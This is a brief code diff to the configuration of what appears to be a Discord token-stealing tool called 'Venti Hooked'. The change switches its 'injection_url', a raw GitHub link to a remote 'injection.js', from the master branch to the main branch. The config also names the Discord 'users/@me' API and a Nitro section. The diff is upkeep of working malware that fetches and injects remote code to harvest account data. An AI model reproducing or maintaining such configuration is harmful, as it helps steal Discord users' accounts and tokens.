@@ -13,7 +13,7 @@ const config = {
   embed_name: 'Venti Hooked', 
   embed_icon: 'https://files.catbox.moe/1qspew.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/RVG-Nikeisfake0/Venti-Injection/master/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/RVG-Nikeisfake0/Venti-Injection/main/injection.js', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
